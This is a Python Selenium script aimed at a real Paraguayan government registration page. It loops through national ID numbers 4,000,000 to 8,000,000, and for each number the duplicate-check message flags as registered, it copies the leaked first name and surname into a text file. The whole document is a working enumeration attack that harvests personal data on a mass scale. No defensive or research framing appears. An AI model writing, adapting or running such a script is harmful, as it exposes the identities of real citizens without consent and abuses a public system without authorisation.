from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time, os

driver = webdriver.Chrome()
driver.get("https://identidad.mtess.gov.py/alumno/register.php")

campo_cedula = driver.find_element(By.NAME, 'value_cedula_1')

for numero_cedula in range (4000000,8000000):
    campo_cedula.clear()
    campo_cedula.send_keys(f"{numero_cedula}" + Keys.ENTER)
    time.sleep(1)
    mensaje_campo = driver.find_element(By.ID, "DenyDuplicatedcedula_1")
    contenido=mensaje_campo.get_attribute("innerHTML")
    if(contenido !=""):
        campo = driver.find_element(By.ID, "readonly_value_nombre_1")
        nombre = campo.get_attribute("value")
        campo = driver.find_element(By.ID, "readonly_value_apellido_1")
        apellido = campo.get_attribute("value")
        f = open("data.txt", "a", encoding="utf-8", errors="ignore")
        f.write(f"{nombre} {apellido}")
        f.write("\n")
        f.close()
driver.quit()